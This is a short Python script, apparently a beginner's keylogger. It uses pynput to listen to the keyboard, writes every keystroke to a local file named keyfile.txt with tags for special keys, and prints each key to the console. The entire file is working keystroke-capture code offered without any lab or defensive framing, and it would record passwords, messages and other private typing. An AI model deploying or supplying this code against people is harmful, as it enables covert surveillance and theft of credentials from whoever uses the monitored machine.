from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as log:
        try:
            log.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                log.write(' [SPACE] ')
            elif key == keyboard.Key.enter:
                log.write(' [ENTER]\n')
            elif key == keyboard.Key.shift:
                log.write(' [SHIFT] ')
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                log.write(' [CTRL] ')
            elif key == keyboard.Key.backspace:
                log.write(' [BACKSPACE] ')
            elif key == keyboard.Key.tab:
                log.write(' [TAB] ')
            elif key == keyboard.Key.esc:
                log.write(' [ESC] ')
            else:
                log.write(f' [{str(key).upper()}] ')

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()